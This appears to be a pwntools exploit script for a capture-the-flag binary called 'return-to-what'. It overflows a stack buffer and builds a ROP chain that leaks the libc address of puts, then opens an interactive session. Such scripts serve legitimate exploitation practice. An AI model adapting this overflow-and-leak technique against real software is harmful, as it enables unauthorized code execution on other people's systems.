#!/usr/bin/env python3

from pwn import *

def main():

    # log level
    context.terminal = ["tmux", "splitw", "-v"]
    context.log_level = 'DEBUG'

    # setup process in pwntools
    context.arch = "amd64"
    elf=ELF("./return-to-what")
    p=elf.process()

    #p=remote("192.1",1337)


    # The buffer looks like this to create a rop that will 
    # leak address of put.
    # padding + pop_rdi + puts_got + puts_plt + main_plt
    
    # trigger buffer overflow
    offset = 56 
    padding = b"A" * offset


    # create rop chain
     
    # 0x000000000040122b : pop rdi ; ret
    pop_rdi = p64(0x000000000040122b)
    puts_got = p64(elf.got["puts"])
    puts_plt = p64(elf.plt["puts"])
    main_plt = p64(elf.symbols["main"])

    rop = pop_rdi + puts_got + puts_plt + main_plt
    
    # create buffer
    buffer = [
            padding,
            rop
            ]

    buffer = b"".join(buffer)
    # start process
    print(p.recvuntil("\n"))
    print(p.recvuntil("\n"))

    # send the buffer
    p.sendline(buffer)

    # print address of put in libc
    puts_address=u64(p.recvuntil("\n").strip().ljust(8,b"\x00"))
    info(f"Puts address: {hex(puts_address)}")
   
    # interact with process
    p.interactive() 
    p.close()
if __name__ == "__main__":
    main()
